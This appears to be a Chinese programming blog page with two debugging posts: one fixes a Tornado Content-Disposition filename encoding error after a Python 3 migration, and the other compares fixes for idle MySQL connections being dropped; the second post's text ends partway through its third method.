<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>土豆不好吃</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="土豆不好吃">
<meta property="og:url" content="http://example.com/page/12/index.html">
<meta property="og:site_name" content="土豆不好吃">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Benny小土豆">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="土豆不好吃" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">土豆不好吃</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-python2-3-port/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/04/17/python2-3-port/index/" class="article-date">
  <time class="dt-published" datetime="2018-04-17T00:00:00.000Z" itemprop="datePublished">2018-04-17</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/04/17/python2-3-port/index/">一次找不到错误的巨坑的http header的url编码的Python 3迁移问题</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期，我把一个Python 2 的项目迁移到了Python 3，今早在进行最后一次测试时，发现下载的一个按钮是失效的。当时立刻就想，完蛋了，难道是遇到了跨平台的问题？那就糟糕了啊，跨平台问题都不太好处理的。</p>
<p>试了下原来的Python 2版本的还正常，那么就是这次迁移有点小问题了。</p>
<p><img src="/images/201804170754535.png"></p>
<h2 id="确定复现"><a href="#确定复现" class="headerlink" title="确定复现"></a>确定复现</h2><p>经过一系列绝望的瞎猫碰死耗子的尝试，发现了当要下载的文件是第三个，就会触发这个错误，抛的异常如下：</p>
<p>[E 180417 11:03:48 web:1590] Uncaught exception GET &#x2F;apps&#x2F;scenario_change&#x2F;page&#x2F;download?_id&#x3D;5aab8287e138235c1c9fa9ea&amp;type&#x3D;task (127.0.0.1)<br>    HTTPServerRequest(protocol&#x3D;’http’, host&#x3D;’127.0.0.1:9118’, method&#x3D;’GET’, uri&#x3D;’&#x2F;apps&#x2F;scenario_change&#x2F;page&#x2F;download?_id&#x3D;5aab8287e138235c1c9fa9ea&amp;type&#x3D;task’, version&#x3D;’HTTP&#x2F;1.1’, remote_ip&#x3D;’127.0.0.1’, headers&#x3D;{‘Host’: ‘127.0.0.1:9118’, ‘Connection’: ‘keep-alive’, ‘Upgrade-Insecure-Requests’: ‘1’, ‘User-Agent’: ‘Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.11; rv:54.0) Gecko&#x2F;20100101 Firefox&#x2F;54.0’, ‘Accept’: ‘text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8’, ‘Dnt’: ‘1’, ‘Referer’: ‘<a target="_blank" rel="noopener" href="http://127.0.0.1:9118/apps/scenario/_change/task/_management.html">http://127.0.0.1:9118/apps/scenario\_change/task\_management.html</a>‘, ‘Accept-Encoding’: ‘gzip, deflate, br’, ‘Accept-Language’: ‘zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7’})<br>    Traceback (most recent call last):<br>      File “C:\Python36\lib\site-packages\tornado\web.py”, line 1513, in _execute<br>        self.finish()<br>      File “C:\Python36\lib\site-packages\tornado\web.py”, line 991, in finish<br>        self.flush(include_footers&#x3D;True)<br>      File “C:\Python36\lib\site-packages\tornado\web.py”, line 947, in flush<br>        start_line, self._headers, chunk, callback&#x3D;callback)<br>      File “C:\Python36\lib\site-packages\tornado\http1connection.py”, line 381, in write_headers<br>        lines.extend(l.encode(‘latin1’) for l in header_lines)<br>      File “C:\Python36\lib\site-packages\tornado\http1connection.py”, line 381, in<br>        lines.extend(l.encode(‘latin1’) for l in header_lines)<br>    UnicodeEncodeError: ‘latin-1’ codec can’t encode characters in position 45-46: ordinal not in range(256)<br>[E 180417 11:03:48 web:1015] Cannot send error response after headers written<br>[E 180417 11:03:48 web:1025] Failed to flush partial response<br>    Traceback (most recent call last):<br>      File “C:\Python36\lib\site-packages\tornado\web.py”, line 1513, in _execute<br>        self.finish()<br>      File “C:\Python36\lib\site-packages\tornado\web.py”, line 991, in finish<br>        self.flush(include_footers&#x3D;True)<br>      File “C:\Python36\lib\site-packages\tornado\web.py”, line 947, in flush<br>        start_line, self._headers, chunk, callback&#x3D;callback)<br>      File “C:\Python36\lib\site-packages\tornado\http1connection.py”, line 381, in write_headers<br>        lines.extend(l.encode(‘latin1’) for l in header_lines)<br>      File “C:\Python36\lib\site-packages\tornado\http1connection.py”, line 381, in<br>        lines.extend(l.encode(‘latin1’) for l in header_lines)<br>    UnicodeEncodeError: ‘latin-1’ codec can’t encode characters in position 45-46: ordinal not in range(256)</p>
<pre><code>During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File &quot;C:\\Python36\\lib\\site-packages\\tornado\\web.py&quot;, line 1022, in send\_error
    self.finish()
  File &quot;C:\\Python36\\lib\\site-packages\\tornado\\web.py&quot;, line 992, in finish
    self.request.finish()
  File &quot;C:\\Python36\\lib\\site-packages\\tornado\\httputil.py&quot;, line 419, in finish
    self.connection.finish()
  File &quot;C:\\Python36\\lib\\site-packages\\tornado\\http1connection.py&quot;, line 448, in finish
    self.\_expected\_content\_remaining)
tornado.httputil.HTTPOutputError: Tried to write 8015 bytes less than Content-Length
</code></pre>
<h2 id="追踪异常1：白高兴"><a href="#追踪异常1：白高兴" class="headerlink" title="追踪异常1：白高兴"></a>追踪异常1：白高兴</h2><p>按照常理讲，咱代码出了异常，咱就定位到报错的最后一行（most recent call last嘛，最后一次调用），看下异常是什么知道个大概，然后跳过去，该回溯的回溯，管它是高级的打断点开debug还是低级的一顿print的，确定问题根源然后修改。</p>
<p>看一眼这个异常，<strong>Tried to write 8015 bytes less than Content-Length</strong>，看样子好像是指定了一个Content-Length但是实际上发送的文件却比这个短8015字节。莫非是迁移到3的过程中对Unicode与bytes应用了错误的<code>len()</code>导致抛异常？</p>
<p>那简单了，看一眼是不是设错了headers就好了啊，Edit - Find - Find in path，限定文件类型为py，开搜！</p>
<p><img src="/images/201804170754546.png"></p>
<p>啥？逗我呢？没有？ [v_tips] 小提示：为啥第一想法要怀疑Content-Length的长度设置错了呢？</p>
<p>很简单啦，Python 2对Unicode的实现emmm这么说吧，在Python 2里，<code>&#39;hello&#39;</code>是二进制（字节流 bytes），<code>u&#39;hello&#39;</code>才是Unicode；但是在3里呢，<code>&#39;hello&#39;</code>是Unicode，<code>b&#39;hello&#39;</code>才是二进制。唉，谁叫Python 问世（第一版发布于1991.02）的时候Unicode标准（1991.10）还没出来呢。</p>
<p>以防你们不晓得这么个大坑，看下图：</p>
<p><img src="/images/2018041707545544.png"></p>
<p>以后在有人跟你说一个汉字是两个字节，你就拿这个图怼死他：不说编码就说一个汉字是几个字节就是耍流氓，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%97%A5%E9%9F%93%E7%B5%B1%E4%B8%80%E8%A1%A8%E6%84%8F%E6%96%87%E5%AD%97">说了编码那也是耍流氓</a>。[&#x2F;v_tips]</p>
<h2 id="追踪异常2：找到根源"><a href="#追踪异常2：找到根源" class="headerlink" title="追踪异常2：找到根源"></a>追踪异常2：找到根源</h2><p>有点扫兴，竟然没有Content-Length，那是因为啥呢？那就继续看着报错回溯呗。扫了一眼，啥，<strong>都是tornado的错</strong>，<strong>不是我的错</strong>？难道我要怀疑编译器解释器和久负盛名的tornado……？ [v_blue] 扩展阅读：</p>
<p>《<a target="_blank" rel="noopener" href="https://v2mm.tech/topic/830/%E5%A4%A7%E5%AE%B6%E6%9C%89%E4%BB%80%E4%B9%88%E5%86%99%E4%BB%A3%E7%A0%81%E5%86%99%E5%88%B0%E6%80%80%E7%96%91%E4%BA%BA%E7%94%9F-%E6%80%80%E7%96%91%E7%BC%96%E8%AF%91%E5%99%A8%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E7%BB%8F%E5%8E%86%E5%90%97">大家有什么写代码写到怀疑人生、怀疑编译器解释器的经历吗</a>》</p>
<p>cookies的时间戳，C语言标准for循环<code>for(int i=0;i++;i&lt;10)</code>，mian，ture，全角符号，以及<code>&lt;link href</code>……[&#x2F;v_blue]</p>
<p>又仔细看了一眼，发现这么一段话：<strong>During handling of the above exception, another exception occurred</strong>:</p>
<p>处理上面这个异常的时候，又来了个这么异常。</p>
<p>啊原来我刚刚看的是后来的异常啊，那我得看第一个异常的尾巴：</p>
<p><strong>UnicodeEncodeError: ‘latin-1’ codec can’t encode characters in position 45-46: ordinal not in range(256)</strong></p>
<p>多少年了，无数的Python程序员都曾经被UnicodeEncodeError与UnicodeDecodeError坑的说不出话来。</p>
<p>可是依旧没有我的代码啊。</p>
<p>终于，通过搜索.txt（下载的文件的扩展名）我成功找到了这一行：</p>
<p>file_name &#x3D; response[‘data’][0][‘task_name’] + ‘.txt’</p>
<p>看来是这句话负责生成文件名的，找到这句的函数定义，继续找调用者，叮咚！</p>
<p>一看函数名叫download，看样子下图这里就是该排错的地方</p>
<p><img src="/images/2018041707545536.png"></p>
<h2 id="解决异常1：瞎比划"><a href="#解决异常1：瞎比划" class="headerlink" title="解决异常1：瞎比划"></a>解决异常1：瞎比划</h2><h3 id="加个Content-Length"><a href="#加个Content-Length" class="headerlink" title="加个Content-Length"></a>加个Content-Length</h3><p>大致看了眼，好像没啥问题。要不在这里加上个Content-Length试试？</p>
<p>self.set_header(“Content-Length”, len(file_content.encode(‘utf-8’)))</p>
<p><img src="/images/2018041707545689.png"></p>
<p>我的基础还是很牢固的，没算错，一点问题都没有，肯定没错啊。但是<strong>Tried to write 8015 bytes less than Content-Length</strong>这个异常还是抛了。</p>
<h3 id="数据类型错了"><a href="#数据类型错了" class="headerlink" title="数据类型错了"></a>数据类型错了</h3><p>也许是数据类型错了？说不定<code>file_name</code>, <code>file_content</code>需要字节流而不是字符串呢？这好像有点接近Unicode错误了。简单的<code>encode(&#39;utf-8&#39;)</code>一下，当然还是继续错啦。</p>
<h3 id="也许是因为header的事情"><a href="#也许是因为header的事情" class="headerlink" title="也许是因为header的事情"></a>也许是因为header的事情</h3><p>那就把header都注释了看看。于是在浏览器里打开了文件……</p>
<p><img src="/images/2018041707545712.png"></p>
<p>那我只留Content-Type</p>
<p><img src="/images/2018041707545743.png"></p>
<p>噗(&#x2F;≧▽≦)&#x2F;我的文件名呢，内容是正确的。</p>
<p>啊，原来是靠的Content-Disposition这个响应头来强制浏览器下载文件，指定文件名什么的啊……</p>
<h2 id="解决异常2：确定问题"><a href="#解决异常2：确定问题" class="headerlink" title="解决异常2：确定问题"></a>解决异常2：确定问题</h2><p>终于，我确定了出错的代码在这一行</p>
<p>self.set_header(“Content-Disposition”, “attachment; filename&#x3D;%s” % file_name)</p>
<p>看样子是文件名。那就把filename替换成硬编码的<code>test.txt</code>，正常下载；再换成<code>tes啊t.txt</code>，一模一样的报错。</p>
<p>于是我果断的搜索了Content-Disposition encoding以及Content-Disposition 编码，看到<a target="_blank" rel="noopener" href="https://blog.robotshell.org/2012/deal-with-http-header-encoding-for-file-download/">这么一篇说得还挺有道理的文章</a>：</p>
<p>Content-Disposition: attachment;filename&#x3D;”$encoded_fname”;<br>filename*&#x3D;utf-8’’$encoded_fname</p>
<p>当然了我没看到下面那句话（<strong>读书要读全啊</strong>），直接套上了</p>
<p>self.set_header(“Content-Disposition”, “attachment; filename*&#x3D;utf-8’’%s” % file_name)</p>
<p>当然继续报错啦。还是<code>file_name</code>数据类型不对？encode成UTF-8？差点用上decode（字符串怎么可能再decode嘛？必然要报错的）</p>
<p><img src="/images/201804170754585.png"></p>
<p>噗，这倒真是<code>tes的t.txt</code>这个字符串的UTF-8编码。</p>
<p>这就纠结了，难道我要把文件名搞成什么ASCII的？比如干脆是几个真伪随机数吧？</p>
<h2 id="解决异常3：解决"><a href="#解决异常3：解决" class="headerlink" title="解决异常3：解决"></a>解决异常3：解决</h2><p>然后又找到了这么一篇<a target="_blank" rel="noopener" href="http://lgbolgger.iteye.com/blog/2108396">例子丰富的文章</a>，看到一半突然想起了，既然要给任意文字编码成ASCII字符集内的，那就用base64啊，但是浏览器又不懂base64没办法给还原回来啊……</p>
<p>唉？？不是有个东西叫URL编码吗？迅速翻了翻例子丰富的文章，还真提了一句……</p>
<p>from urllib.parse import quote<br>self.set_header(“Content-Disposition”, “attachment; filename&#x3D;%s” % quote(‘tes的t.txt’))</p>
<p><img src="/images/2018041707545941.png"></p>
<p>我爱emoji，emoji也爱我。???典型的傲娇受。</p>
<p>??? ??? ??? ??? ??? ??? ???</p>
<p>其实<a target="_blank" rel="noopener" href="https://blog.robotshell.org/2012/deal-with-http-header-encoding-for-file-download/">第一篇文章</a>提了一句的：其中， <code>$encoded_fname</code>指的是将 UTF-8 编码的原始文件名按照 RFC 3986 进行百分号编码（percent encoding）后得到的。</p>
<p>百分号编码就是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81">URL编码</a>啦……</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个小问题其实隐藏的还是很深的，而且奇特的是在Python 2没有问题但是到了3就冒出来了。</p>
<p>光看报错基本上没什么线索，只能靠对业务的熟悉摸索找到对应的代码，仔细排查最终确定导致出错的代码……然后解决之。</p>
<p>就我这水平啊，还是别怀疑编译器解释器，也别怀疑久负盛名的库了，绝对是我错了。</p>
<blockquote>
<p>You tell me I’m wrong, then you’d better prove you’re right. ——M.J.</p>
</blockquote>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>经过一小段时间的阅读源代码，在tornado源代码中发现了问题的根源。跟着我的节奏走！先看下抓包的结果吧：</p>
<p>Python 2未编码 <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2018/04/2018041803535426.png"><img src="/images/2018041803535426.png"></a></p>
<p>Python 2 URL编码 <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2018/04/2018041803535177.png"><img src="/images/2018041803535177.png"></a></p>
<p>Python 3 URL编码 <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2018/04/2018041803535360.png"><img src="/images/2018041803535360.png"></a></p>
<p>我们知道问题是由set_header引起的，所以看一下set_header的源代码：</p>
<p>def set_header(self, name, value):<br>        # type: (str, _HeaderTypes) -&gt; None<br>        “””Sets the given response header name and value.</p>
<pre><code>    If a datetime is given, we automatically format it according to the
    HTTP specification. If the value is not a string, we convert it to
    a string. All header values are then encoded as UTF-8.
    &quot;&quot;&quot;
    self.\_headers\[name\] = self.\_convert\_header\_value(value)
</code></pre>
<p>非常清楚的看到调用了一个<code>_convert_header_value()</code>，继续追溯</p>
<pre><code>def \_convert\_header\_value(self, value):
    # type: (\_HeaderTypes) -&gt; str

    # Convert the input value to a str. This type check is a bit
    # subtle: The bytes case only executes on python 3, and the
    # unicode case only executes on python 2, because the other
    # cases are covered by the first match for str.
    if isinstance(value, str):
        retval = value
    elif isinstance(value, bytes):  # py3
        # Non-ascii characters in headers are not well supported,
        # but if you pass bytes, use latin1 so they pass through as-is.
        retval = value.decode(&#39;latin1&#39;)
    elif isinstance(value, unicode\_type):  # py2
        # TODO: This is inconsistent with the use of latin1 above,
        # but it&#39;s been that way for a long time. Should it change?
        retval = escape.utf8(value)
    elif isinstance(value, numbers.Integral):
        # return immediately since we know the converted value will be safe
        return str(value)
    elif isinstance(value, datetime.datetime):
        return httputil.format\_timestamp(value)
    else:
        raise TypeError(&quot;Unsupported header value %r&quot; % value)
    # If \\n is allowed into the header, it is possible to inject
    # additional headers or split the request.
    if RequestHandler.\_INVALID\_HEADER\_CHAR\_RE.search(retval):
        raise ValueError(&quot;Unsafe header value %r&quot;, retval)
    return retval
</code></pre>
<p>这段代码有点冗长，但实际上只做了一件事情，将传递过来的value转换为字符串，更进一步，在Python 2中，如果传过来的是<code>&#39;hello&#39;</code>，那么直接返回；如果类型是<code>u&#39;hello&#39;</code>, 那么<code>escape.utf8(value)</code>。在Python 3中如果是<code>&#39;hello&#39;</code>那么直接返回，如果是<code>&#39;hello你&#39;.encode(&#39;utf-8&#39;)</code>，那么用latin1解码。</p>
<p>最终这段代码会保证返回的类型是对应Python 2&#x2F;3的str类型。</p>
<p>但其实这段代码并没有什么错，不过确实写的有点难懂。 之后继续追溯到<code>write_headers()</code>，在http1connection.py的第380行左右：</p>
<p>if PY3:<br>            lines.extend(l.encode(‘latin1’) for l in header_lines)<br>        else:<br>            lines.extend(header_lines)</p>
<p>其中header_lines是一个生成器对象，包含了所有的headers，其类型为str（对应2&#x2F;3的类型） 那么错误就显然易见了，在Python 3中对<code>&#39;hello&#39;.encode(&#39;latin1&#39;)</code>是没有任何问题的，但是<code>&#39;hello和&#39;.encode(&#39;latin1&#39;)</code>肯定会报UnicodeEncodeError啊，这也印证了我最开始发现的编码错误。</p>
<p>但是在Python 2，直接就走了下面extend进去了，自然也没问题了。 但是如果我们调用set_header时传递的参数是<code>&#39;hell你&#39;.encode(&#39;utf-8&#39;)</code>，那么在<code>_convert_header_value</code>中会被用latin1解码，在这里又使用latin1编码，又回到了utf-8编码之后的形态，所以自然会出现对应文件名的UTF-8编码，也印证了上面下载出来的乱码文件。</p>
<p>所以，如果要修复这个问题，要么我们保证只传递过来ASCII的文件名（进行URL编码），这样用latin1编码就不会错了。要么直接把这俩latin1改成utf-8。</p>
<p>不过根据<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7230#section-3.2.4">RFC7230 section 3.2.4</a>:</p>
<blockquote>
<p>Historically, HTTP has allowed field content with text in the ISO-8859-1 charset [ISO-8859-1], supporting other charsets only through use of [RFC2047] encoding. In practice, most HTTP header field values use only a subset of the US-ASCII charset [USASCII]. Newly defined header fields SHOULD limit their field values to US-ASCII octets. A recipient SHOULD treat other octets in field content (obs-text) as opaque data.</p>
</blockquote>
<p>这么做其实是有悖标准的，但是Python 2的版本直接不管不顾发出去了啊，实际上Python 2版本的应该拒绝这种headers的。我也很纠结，我也觉得没办法啊。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/04/17/python2-3-port/index/" data-id="clhp7rtie0073s2qrhi226brl" data-title="一次找不到错误的巨坑的http header的url编码的Python 3迁移问题" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-python-longpoll-db/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/04/13/python-longpoll-db/index/" class="article-date">
  <time class="dt-published" datetime="2018-04-13T00:00:00.000Z" itemprop="datePublished">2018-04-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/04/13/python-longpoll-db/index/">Python长期连接数据库的最不佳实践：Lost connection to MySQL server during query</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="问题来源"><a href="#问题来源" class="headerlink" title="问题来源"></a>问题来源</h2><p>前几天用Tornado做Web服务器起了一个简单的以表格显示数据库中内容的网页，然后把它放到lab服务器上做demo。卧病几天之后打开邮箱，发现mentor邮件说表格中不显示数据。赶紧登上服务器screen回去看下，发现抛了个这么异常：Lost connection to MySQL server during query</p>
<p><img src="/images/2018041314312651.png"></p>
<p>当然也说不定会是MySQL server has gone away</p>
<blockquote>
<p>Python：我这么爱你，你为什么要离开我？</p>
<p>MySQL：你丫八个小时都不跟俺说一句话，想起来了就冷不丁的冒一句，然后就消失，就这样还是俺真爱？哼！</p>
<p>Python：……（好吧，被你发现了，我就是玩玩而已你还认真了，真是的?）</p>
</blockquote>
<p>以上内容纯属虚构，请勿对号入座（咋想也没办法对号入座啊）</p>
<h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>造成这个异常的原因其实非常简单，就是基本上没啥人访问我的demo link，导致连接对象超过了wait_timeout的默认28800秒（即8小时），然后MySQL就关闭了这个连接。由于TCP的特性，Python的驱动并不会知道被甩了，当有人访问demo link也就是进行一次查询的时候，就会触发异常，于是表格自然就是空白的啦。</p>
<p>为了更进一步的说明这个问题并提供若干最不佳实践，咱先简单的说说这段代码……GitHub可以戳下面的触手猫（commit为959ce78f854894397a75bad0efef4ef0de06b7ca） [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/Intern-Life/blob/959ce78f854894397a75bad0efef4ef0de06b7ca/mission%208/front-end-pagination.py'/]%E8%A7%A6%E6%89%8B%E7%8C%AB%E5%8D%81%E5%91%A8%E5%B9%B4%E5%95%A6/[/gt/]">https://github.com/BennyThink/Intern-Life/blob/959ce78f854894397a75bad0efef4ef0de06b7ca/mission%208/front-end-pagination.py&#39;\]触手猫十周年啦\[/gt\]</a></p>
<h3 id="开头"><a href="#开头" class="headerlink" title="开头"></a>开头</h3><p>首先在开头引入几个库，然后新建两个全局的对象：一个是用于数据库连接的con，一个是查询游标cur</p>
<p>con &#x3D; mysql.connector.connect(host&#x3D;’127.0.0.1’, user&#x3D;’root’, password&#x3D;’root’, database&#x3D;’san’)<br>cur &#x3D; con.cursor()</p>
<h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>在make_app函数中我们可以看到定义了俩路由，&#x2F;对应Index类，&#x2F;list&#x2F;对应Retrive类。</p>
<p>Retrive类重载了get方法，返回的是一个函数get_data，而get_data则是进行数据库相关操作的函数，代码如下：</p>
<p>def get_data():<br>    cur.execute(‘SHOW COLUMNS from switch_device’)<br>    col_data &#x3D; cur.fetchall()<br>    col_field &#x3D; [i[0] for i in col_data]<br>    cur.execute(‘SELECT * FROM switch_device’)<br>    data &#x3D; cur.fetchall()</p>
<pre><code>bulk\_dic = \[\]
for i in range(len(data)):
    es\_dic = dict(zip(col\_field, data\[i\]))
    bulk\_dic.append(es\_dic)
return json.dumps(bulk\_dic)
</code></pre>
<p><strong>我不由得想起了我最爱的列表推导</strong>……反正就是查询了两次，根据列名和数据把表中的内容组成了一个json。可惜啊我不知道<a target="_blank" rel="noopener" href="https://dmesg.app/mysql-es-mongo.html">DictCursor</a></p>
<h3 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h3><p>入口非常简单，就是启动tornado而已。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通篇可以看到有这么几个特点：</p>
<ol>
<li><strong>cur和con是全局的</strong>，只要Python脚本在运行，那么这俩对象的id（内存地址）就不会改变，无论多少次的页面刷新（数据库查询操作）都是由cur这个全局对象执行的</li>
<li>并没有对connection进行close。脚本在收到相应的信号量时会执行对应的行为，比如SIGINT也即Ctrl+C，自然就退出了，连接自然也就被释放了。</li>
</ol>
<h3 id="再一次说明问题原因"><a href="#再一次说明问题原因" class="headerlink" title="再一次说明问题原因"></a>再一次说明问题原因</h3><p>再一次总结出错原因：demo太冷门没人看，<strong>连接闲置时间超过wait_timeout，MySQL关闭连接</strong>，然后再次触发查询的时候，自然而然就会报错了。</p>
<p>针对这个问题，我想了几种个人觉得不咋样的解决方法，所以被称之为“<strong>最不佳实践</strong>”。当然提前说一个比较好的办法，那就是用数据库框架啊，类似SQLAlchemy什么的，这类框架应该会处理这类问题的；还有就是，如果对应的驱动程序提供了类似<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/c-api-auto-reconnect.html">automatic reconnection</a>这种特性，那也好办多啦</p>
<p>注意：为了方便叙述，下面的get_data()就是指代数据库操作啦！</p>
<h2 id="方法1：增加wait-timeout时间"><a href="#方法1：增加wait-timeout时间" class="headerlink" title="方法1：增加wait_timeout时间"></a>方法1：增加wait_timeout时间</h2><p>既然数据库小姐默认的“生气时间”是28800秒，那咱简单的给它调大点不就好了。</p>
<blockquote>
<p>Python：亲爱的，你以后要多点耐心，小不忍则乱大谋啊~ MySQL：好吧好吧，那我就多点耐心。 <em>一年之后……</em> Python：亲爱的，干嘛呢？ MySQL：老娘不认识你，丨。 <em>Python吸取教训，不能冷落小姐姐太久，于是再次通过自己的阴谋诡计取得小姐姐的好感与信任。</em> Python：亲爱的，你以后要多点耐心，小不忍则乱大谋啊~ MySQL：好吧好吧，那我就多点耐心。 <em>十几天之后……</em> Python：亲爱的，干嘛呢？ MySQL：忙着呢，没空理你。 Python：…………（算了，干嘛一棵树上吊死）</p>
</blockquote>
<p>简单的在得到游标之后来这么一句：</p>
<p>cur.execute(‘SET SESSION WAIT_TIMEOUT &#x3D; 2147483’)</p>
<p>注：</p>
<p>2147483（约24天）是Windows平台的MySQL的WAIT_TIMEOUT最大值，其他平台为31536000（一年）</p>
<p>如果有必要的话咱还可以<code>SET GLOBAL WAIT_TIMEOUT = 2147483</code>，不过你真的确定要global么，说不好DoS了，查完日志就该回家种田了啊。</p>
<p>但实际上这是一种想当然一拍脑门一跺脚的<strong>完全不现实</strong>的不经过仔细思考的解决方案。为啥捏，待我慢慢道来。</p>
<h3 id="治标不治本"><a href="#治标不治本" class="headerlink" title="治标不治本"></a>治标不治本</h3><p>不，这个三级标题是错误的。这种解决方案<strong>不仅不治标，更不治本</strong>！甚至有损于数据库的性能。暂且不考虑平台兼容性（设置为31536000对Windows平台就是无效值了啊），如果真的就是连接限制了超过timeout的时间，然后突然有了一次访问，那还不是照样挂？</p>
<h3 id="影响数据库性能"><a href="#影响数据库性能" class="headerlink" title="影响数据库性能"></a>影响数据库性能</h3><p>MySQL为什么要有这样一个参数？很简单啊，为了提高服务器性能啊。每维持一个连接都是需要耗费一定的内存和CPU资源的，关闭长期不使用的连接自然节约了资源，同时也避免了max_connections达到上限造成了DoS的结果。</p>
<p>即使我们把max_connections的值调到很高尽可能避免DoS，这对于服务器的性能也是不利的，需要更多内存，更多文件描述符。这同样也是一个<strong>既不治标也不治本</strong>的解决“解决方案”的方案。堆硬件？有那钱还不如打赏辛苦写作本文的俺呐！</p>
<p>注：max_connections默认值为151，上限为100000，同时还要受到文件描述符（用ulimit查看）的限制。</p>
<h3 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h3><p>放弃吧，别用这种不太好的办法了。</p>
<h2 id="方法2：每次刷新页面都新建连接-查询-关闭连接"><a href="#方法2：每次刷新页面都新建连接-查询-关闭连接" class="headerlink" title="方法2：每次刷新页面都新建连接-查询-关闭连接"></a>方法2：每次刷新页面都新建连接-查询-关闭连接</h2><p>既然问题在于连接限制，那咱就每次数据库相关的操作都新建连接-查询-关闭连接。代码也很简单，把全局的数据库连接移动到函数内：</p>
<p>con &#x3D; mysql.connector.connect(host&#x3D;’127.0.0.1’, user&#x3D;’root’, password&#x3D;’root’, database&#x3D;’san’)<br>cur &#x3D; con.cursor()</p>
<h1 id="执行操作"><a href="#执行操作" class="headerlink" title="执行操作"></a>执行操作</h1><p>con.close()<br>return some_value</p>
<p>这确实是一个非常简单的处理方式，很强，没有bug，绝对管用，不仅治标也治本。只是有一个问题，新建连接会慢点，在某些场景可能会稍差一点点</p>
<p>新建一次连接自然是比较费时、费资源的啦，说不定要0.1秒呢，那如果同时访问的人多了造成大并发的局面（tornado是多线程非阻塞的服务器，所以短时间内可能会创建很多个con对象），那可能速度就要稍微慢一点了。</p>
<p>不过这种方法确实好用，因为抓住了问题的本质：<strong>闲置连接被关闭</strong>。绝大部分情况下用这个方案就可以啦</p>
<h2 id="方法3：数据库的操作之前con-reconnect"><a href="#方法3：数据库的操作之前con-reconnect" class="headerlink" title="方法3：数据库的操作之前con.reconnect()"></a>方法3：数据库的操作之前con.reconnect()</h2><p>从方法3中我们发现了<code>con.reconnect()</code>这个神奇的小东西，那么我们在数据库操作之前执行这个，这样每次都会重新连接，那就可以啦。</p>
<p>con.reconnect()<br>get_data()</p>
